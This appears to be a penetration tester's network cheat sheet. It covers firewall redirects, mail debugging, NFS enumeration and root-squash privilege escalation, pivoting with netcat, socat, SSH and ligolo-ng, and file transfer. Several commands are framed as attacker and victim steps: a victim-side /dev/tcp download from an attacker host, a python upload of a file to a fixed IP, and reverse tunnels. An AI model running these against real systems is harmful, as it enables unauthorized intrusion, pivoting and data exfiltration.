Title: Network Cheatsheet
Slug: misc/network
Date: 1957-01-01 00:00
Category: Cheatsheet

## Firewall

Redirect all requests on loopback interface (lo) port 80 to port 8080:

~~~shell
sudo iptables -t nat -A OUTPUT -o lo -p tcp --dport 80 -j REDIRECT --to-port 8080
~~~

Create a Windows firewall rule:

~~~cmd
netsh advfirewall firewall add rule name="<rule name>" dir=<in|out> action=<allow|deny> protocol=<protocol> localport=<port>
~~~

## Mail

Start a debugging mail server:

~~~shell
# Deprecated since python 3.12
python -m smtpd -n -c DebuggingServer localhost:25

# Using https://aiosmtpd.aio-libs.org/en/latest/index.html
## Start a debug server on port 8025
# pipx install aiosmtpd
python -m aiosmtpd -n
~~~

**Note**: Always better to not run it as root; use instead `iptables` to redirect traffic from a not restricted port (eg. `2525`) to `25`.

Send an email via specified mail-server using `swaks`:

~~~shell
swaks --to <recipient> --server <mail server> --from <sender> --header "<subject>" --body "<markdown body content>"
~~~

## NFS

Enumeration:

~~~shell
nmap -p 111,2049 --script="nfs-*" <target ip>
~~~

Show export list:

~~~shell
showmount -e <target ip>
~~~

Mount remote shared folder to local folder:

~~~shell
sudo mount <target ip>:<remote dir> <local dir>
~~~

Unmount volume:

~~~
sudo umount <local mount point> [-l] [-f]
~~~

where: 

- `-l` : lazy unmount - unmount the volume while the software is still running
- `-f`: force unmounting

### Root Squash - Privilege Escalation

 When placing a file into a mounted share, it will inherit current user's UID and GID. This means that it's possible to place an executable binary into the folder by spoofing the UID/GID on the attacker machine (i.e. creating a temporary user and group with the desired ids on the local machine) and then set the SUID so that, on the remote machine, the binary will be ran as the target user.

- By default, **root squash** is enabled. This security mechanism prevents placing files belonging to root (UID and GID = 0). Generally, those files will be mapped to `nobody`.
- If the option `no_root_squash` is enabled for a share, it's possible to place files as root and escalate privileges.

On the NFS server, exports are defined at `/etc/exports`; check this file (having access to server) to enumerate exports and their options (such as `no_root_squash`).

- Another way to check if `no_root_squash` is enabled is to place a file in the shared folder as root; if the UID is mapped to `nobody` then the `no_root_squash` is not active.


## Pivoting

### netcat

Remote port forwarding (raw http required for http request):

~~~shell
mknod node1 p
nc <local address> <local port> > node1 | nc <remote address> <remote port> < node1
~~~

Remote port forwarding with track of input and output messages:

~~~shell
nc <local address> <local port> < node1 | tee -a in | nc <remote address> <remote port> | tee -a out > node1

nc <remote address> <remote port> < node1 | tee -a in | nc <local address> <local port> | tee -a out > node1
~~~

### socat

Remote Port Forwarding:

~~~shell
# Attacker
socat tcp4-listen:<server port>,reuseaddr,fork tcp4-listen:<forward target port>,reuseaddr

# Victim
while true; do socat TCP4:<attacker>:<server port> TCP4:127.0.0.1:<to forward port> ; done
~~~

IPV6 Tunneling:

~~~shell
# UDP:
socat UDP4-LISTEN:5683,fork,su=nobody UDP6:[aaaa::212:4b00:615:a1f7]:5683

# TCP:
socat TCP4-LISTEN:22,fork,su=nobody TCP6:[2a01:198:79d:1::8]:22

# UDP, IPv6
socat UDP6-LISTEN:5683,fork,su=nobody UDP6:[aaaa::212:4b00:615:a1f7]:5683

# Using in a script:
nohup socat TCP4-LISTEN:22,fork,su=nobody TCP6:[2a01:198:79d:1::8]:22 &
~~~

### SSH

Local Port Forwarding:

~~~shell
ssh -L [bind_address:]port:host:hostport <user>@<host> [-N]
~~~

Remote Port Forwarding:

~~~shell
ssh -R [bind_address:]port:host:hostport <user>@<host> -p <port> [-N]
~~~

Start a SOCKS proxy:

~~~shell
ssh <user>@<host> -D <port> -N
~~~

In Windows, use [plink](https://www.cog-genomics.org/plink/) which wraps SSH to create connection to remote hosts. Syntax is mostly similar. 

### Proxychains

Setup SOCKS proxy port in `/etc/proxychains.conf`:

~~~config
[ProxyList]
socks4  <address> <port>
# or
# socks5 <address> <port>
~~~

Use SOCKS proxy when running a command:

~~~shell
proxychains <command>
~~~

### ligolo-ng

[ligolo-ng](https://github.com/nicocha30/ligolo-ng) is a _simple_, _lightweight_ and _fast_ tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a **tun interface** (without the need of SOCKS).

~~~attacker-machine
sudo ip tuntap add user <your_user> mode tun ligolo
sudo ip link set ligolo up
sudo ip route add <target pivoted subnet> dev ligolo

./proxy -selfcert -laddr 0.0.0.0:443
~~~

~~~victim
./agent -connect <attacker ip>:443 -ignore-cert
~~~

After the `agent` is connected to the attacker server:

~~~linogo-ng
> session
# Select session

> start
# start tunnel
~~~

## Utils

Send http request with python3, useful when curl is unavailable:

~~~shell
python3 -c "import requests; files={'file': open('res','r')}; requests.post('[http://192.168.56.108:8000',](http://192.168.56.108:8000',) files=files)"
~~~

Send file through NC:

~~~shell
// Receiver
nc -lvnp 1234 > something.zip 

// Sender
cat something.zip | netcat server.ip.here 1234
~~~

Transfer files using raw HTTP requests when no wget, curl or ssh is not available:

~~~shell
# on the attacker machine
python -m http.server [<port>]

# on the victim
exec 3<> /dev/tcp/<attacker ip>/<attacker port>
echo -e "GET /<filename> HTTP/1.1\r\nHost: <attacker ip>\r\nConnection: close\r\n\r\n" >&3
cat <&3 > <filename>
~~~